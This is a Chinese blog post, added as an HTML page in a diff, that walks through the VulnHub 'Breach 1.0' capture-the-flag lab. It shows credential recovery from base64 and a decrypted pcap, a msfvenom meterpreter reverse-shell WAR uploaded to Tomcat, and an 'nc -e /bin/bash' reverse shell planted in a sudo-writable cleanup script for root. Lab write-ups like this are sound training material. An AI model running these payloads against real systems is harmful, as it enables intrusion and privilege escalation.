@@ -1,0 +1,525 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>vulnhub breach1.0 - Hexo</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+
+  
+  
+  <meta name="description" content="国外大佬的wp
+http://camelinc.inf..."> 
+  
+  <meta name="author" content="John Doe"> 
+
+  
+    <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  
+  
+    <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  
+  
+    <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  
+  
+    <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_onl0g0h21np.css">
+
+  
+
+  
+  
+  
+<link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+  
+  
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css">
+
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        onlyPost: 'false',
+        loading: '/images/theme/loading.gif'
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      motto: {
+        api: '',
+        default: '我在开了灯的床头下，想问问自己的心啊。'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        alwaysShow: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: true
+      }
+    }
+  </script>
+
+  
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+
+
+<nav class="navbar">
+  <div class="left"></div>
+  <div class="center">vulnhub breach1.0</div>
+  <div class="right">
+    
+      <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+    
+    <i class="iconfont iconmenu j-navbar-menu"></i>
+  </div>
+</nav>
+
+  <nav class="menu">
+  <div class="menu-wrap">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content">
+      
+      
+      
+      
+      <li class="menu-item"><a href="/ " class="underline"> 首页</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/galleries " class="underline"> 摄影</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/archives " class="underline"> 归档</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/tags " class="underline"> 标签</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/categories " class="underline"> 分类</a></li>
+      
+      
+      
+      
+      <li class="menu-item"><a href="/about " class="underline"> 关于</a></li>
+      
+    </ul>
+    <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  </div>
+</nav>
+  <main id="main">
+  <div class="container" id="container">
+    <article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">vulnhub breach1.0</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>October 26, 2020</span
+        class="post-info-item">
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2254</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <p>国外大佬的wp</p>
+<p><a target="_blank" rel="noopener" href="http://camelinc.info/blog/2017/03/Vulnhub---Breach-1-boot2root-CTF-walkthrough/">http://camelinc.info/blog/2017/03/Vulnhub—Breach-1-boot2root-CTF-walkthrough/</a></p>
+<p>镜像：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/breach-1,152/">https://www.vulnhub.com/entry/breach-1,152/</a></p>
+<p>靶机:192.168.110.140</p>
+<p>攻击机kali 192.168.110.129</p>
+<p><strong>网络适配器都设置成仅主机模式</strong></p>
+<h2 id="0x01信息收集"><a href="#0x01信息收集" class="headerlink" title="0x01信息收集"></a>0x01信息收集</h2><p><a target="_blank" rel="noopener" href="http://192.168.110.140/index.html">http://192.168.110.140/index.html</a></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/rF0Exyh8vDccnMrQ.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><strong>查看源码</strong></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/kM3IY3tb5z2Q1t7f.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</p>
+<p>Base64解码两次****</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/lwgtGChyZIAw2vrI.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"><em>pgibbons:damnitfeel$goodtobeagang$ta</em></p>
+<p>点击图片会进入到这里</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/VuB9BmZSaxPUSwkl.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/E1F0J4DXQdYmir7j.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>需要登陆，用刚刚得到的那串试试</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/pmYYTueGIK80Ltjn.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>用的是impresscms   （这里可以查看cms的漏洞  sql）</p>
+<p>红框那会有三封未读邮件</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/bZOXB2im38TEFBnz.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>内容分别是</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/tVBvunQnXNNb8tGG.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/3SC5clfYqJgynJlI.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/4Do2vwOxneZvIo0K.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>链接下载了一个文件</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/Q3KRvgeUvXOKiZtS.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>原来是一个密钥</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/KgMbNrGNCyQ5cPeR.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>然后没有了线索，在页面摸爬了好久</p>
+<p>发现了这个有个链接</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/vRtEnGhLLGeKlQBK.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>pcap  一看就是需要wireshark打开</p>
+<p>但是加密了，需要上面ssl解密</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/mcq5yJMJR4J3FB9G.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>上面邮件内容告诉我们密码都设置为  tomcat</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/A8sCdqz4ky4X26kq.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>利用java 的keytool获取证书</p>
+<p>将keystore放在c盘下</p>
+<p>密码 tomcat</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/cI7CFg8CKECqYExd.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/A0X4K6ViFnOWicuo.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>接着导出 p12 证书</p>
+<p>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12<br>-srcalias tomcat<br></code></pre></td></tr></table></figure>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/x2o0UjGd7vsAuZIX.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>然后导入这个ssl证书最新版wireshark已经 ssl 改为 tls，其实ssl/tls都已统称通信加密协议，所以就放一块了</p>
+<p>打开Wireshark  编辑–首选项–Protocols–SSL，点击右边的Edit：</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/9xCaaUfqRJBvAj1V.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>过滤规则只查看http包</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/PVkSJmwW9AOHiwJX.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>发现包含登录用户名密码的数据包， 采用http basic认证，认证数据包为： Basic</p>
+<p>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC    这是base64编码的用户名密码</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/GJDr1g2Q61ZZjrAP.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>解码出来  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB<br></code></pre></td></tr></table></figure>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/OsPutE71gZUy6SLY.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>登录这个网站</p>
+<p>查阅了多数资料这个需要挂代理，打开burpsuite 代理拦截关闭 浏览器开启bp的代理</p>
+<p><a target="_blank" rel="noopener" href="https://192.168.110.140:8443/_M@nag3Me/html">https://192.168.110.140:8443/_M@nag3Me/html</a></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/oQwCWs1MWha0S73k.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>输入刚刚得到的账号和密码</p>
+<p>tomcat</p>
+<p>Tt\5D8F(#!*u=G)4m7zB</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/BQsc3PI7awMlP67u.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>登录后得到这个后台网站</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/xXEaXNKwboWx0RZA.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<h2 id="0x02获取webshell"><a href="#0x02获取webshell" class="headerlink" title="0x02获取webshell"></a>0x02获取webshell</h2><p>上传一个txt文件发现只能上传war的文件</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/kQenRWS0s5I4dfyD.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>那么用msf生成一个马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">msfvenom -p java&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.110.129 lport&#x3D;1234 -f war -o test.war<br></code></pre></td></tr></table></figure>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/WqaSoGUVnc6KuWg5.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>然后进入msfexploit/multi/handler模块</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/MJMkHFUGPjh87t5g.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>设置payload</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/rSooWC9kvzN2NrQx.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"><img   class="lazyload" data-original="https://uploader.shimo.im/f/GaKNKIR8CBb0JbDk.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>上传生成的test.war文件并迅速点击/test</p>
+<p>然后msf直击runun</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/cd5mLuEUjl28WLSf.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/sBX2guGO8MmNZsag.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><strong>getshell</strong></p>
+<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>从python命令提示符到交互式shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<br></code></pre></td></tr></table></figure>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/7ch3PodMqT1IzYVE.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>uname -a看能否内核提权发现版本不能</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/cC3q1TlJBOBik6p3.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>去网站根目录发现奇怪的文件</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/kpAoIEBEwEywNxv4.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>使用cat查看两个奇怪的php</p>
+<p>发现数据库用户 为root  密码为空</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/3bI21e9IlP3QimmX.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>进入数据库</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/0g2qHB2qLjmzKrSb.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>一步一步数据库查看 库—–表——列</p>
+<p>奇怪的password  是个MD5</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/L9AGCYnfqzF8wsTf.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>解密得到thelaststraw</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/kPdK2epoY9SxOLsk.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/8eEZWmnQ3lsfnbTp.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>查看有刚刚看到的用户</p>
+<p>我们登陆一下</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/ztiB1cGJdr0ryt5E.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>查看一下历史命令</p>
+<p>有用户登录的历史</p>
+<p>然后现在没有密码</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/zQ80GJlRhvNxBvlt.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/dEQQh1MhIWF9K5nu.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>使用strings把图片可打印的字符给打印出来</p>
+<p>只有bill.jpg 最后出现像故意留下的密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">tEXtComment<br>coffeestains<br></code></pre></td></tr></table></figure>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/1wt5ZLX5j4VBFIRd.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>登陆成功</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/M6yJwLlPXKYr6Ta3.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>登陆靶机也成功</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/MkBkSn8oi41m4qpc.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>查看历史命令</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/a247YMUVZmiXKjNF.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/oQWLCNGoVoftH38P.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>使用nc反弹个shell</p>
+<p>echo “nc -e /bin/bash 192.168.110.129 8888” &gt; shell.txt</p>
+<p>然后在使用tee命令把shell.txt写入到tidyup.sh</p>
+<p>cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</p>
+<p>shell已经反弹过来了</p>
+<p>tee的使用<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-tee.html">https://www.runoob.com/linux/linux-comm-tee.html</a></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/YqknnFHQYBfbdShH.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/t7E6mzq2ekqi2RID.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>使用scp下载图片</p>
+<p>注：使用scp需要开启ssh服务<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-scp.html">https://www.runoob.com/linux/linux-comm-scp.html</a></p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/mVPL9iJ2ThjeQxTW.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">scp flair.jpg root@192.168.110.129:&#x2F;home&#x2F;<br></code></pre></td></tr></table></figure>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/zmQl5hufSamrcibf.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<p>查看图片</p>
+<p><img   class="lazyload" data-original="https://uploader.shimo.im/f/cl1HHPyaNc8diy9k.png!thumbnail" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="图片"></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol>
+<li>信息收集每一个地方都不要放过往往做不起眼的地方就会有关键信息</li>
+<li>keytool的使用</li>
+<li>scp远程拷贝命令</li>
+</ol>
+
+      </section>
+      <section class="extra">
+        
+        <ul class="copyright">
+  
+  <li><strong>本文作者：</strong>John Doe</li>
+  <li><strong>本文链接：</strong><a href="http://example.com/2020/10/26/vulnhub%20%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%20%20breach1_0/index.html">http://example.com/2020/10/26/vulnhub%20%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%20%20breach1_0/index.html</a></li>
+  <li><strong>版权声明：</strong>本博客所有文章均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"
+      rel="external nofollow" target="_blank"> BY-NC-SA </a>许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        <section class="donate">
+  <div class="qrcode">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+        
+<nav class="nav">
+  
+  
+    <a href="/2020/10/26/hello-world/">Hello World<i class="iconfont iconright"></i></a>
+  
+</nav>
+
+      </section>
+      
+      <section class="comments">
+  
+  <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article>
+  </div>
+</main>
+  <footer class="footer">
+  <div class="footer-social">
+    
